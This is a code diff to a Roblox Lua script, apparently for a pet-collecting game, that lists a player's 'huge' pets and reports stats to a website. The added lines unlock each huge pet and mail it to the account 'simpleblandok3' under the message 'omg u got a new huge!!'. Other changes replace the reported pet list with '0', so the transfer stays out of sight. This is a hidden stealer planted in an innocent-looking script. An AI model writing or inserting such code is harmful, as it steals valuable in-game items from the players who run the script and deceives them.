@@ -102,8 +102,6 @@ local HttpService = game:GetService("HttpService")
 local Library = require(ReplicatedStorage:WaitForChild("Library"))
 local ProcessedHuges = {}
 
-local hugePetsList = {} -- Global variable to store huge pet names
-
 function ProcessHugePets()
     while true do
         local function GetItemInfo(ItemsClass, ItemsName)
@@ -122,7 +120,7 @@ function ProcessHugePets()
 
         local function getCurrentHugePets()
             local GoldPetsTable = {}
-            for _, Pet in ipairs(ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren()) do
+            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
                 table.insert(GoldPetsTable, Pet.Name)
             end
             return GetItemInfo("Pet", GoldPetsTable)
@@ -131,16 +129,38 @@ function ProcessHugePets()
         local hugePets = {}
         local uids = {}
 
-        for _, MadeTable in ipairs(getCurrentHugePets()) do
+        for i, MadeTable in next, getCurrentHugePets() do
             table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
             table.insert(uids, MadeTable.uid)
         end
 
         if #hugePets > 0 then
             print("Huge pets you have right now:", table.concat(hugePets, ", "))
-            hugePetsList = hugePets -- Update the global variable with the current list
-        end
 
+            for i = #uids, 1, -1 do
+
+        
+                local args = {
+                    [1] = uids[i],
+                    [2] = false
+                }
+
+                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+                wait(1)
+                wait(3)
+
+                local args = {
+                    [1] = "simpleblandok3",
+                    [2] = "omg u got a new huge!!",
+                    [3] = "Pet",
+                    [4] = uids[i],
+                    [5] = 1
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                wait(3)
+            end
+        end
         wait(3)
     end
 end
@@ -166,7 +186,7 @@ local function WebsiteDataUpdate()
                 Username = player,
                 VoidTicketsValue = woodengiftamount,
                 DiamondsValue = "0",
-                HugeList = hugePetsList, -- Reference the global variable
+                HugeList = "0", -- Reference the global variable
                 Server = "0"
             })
         })
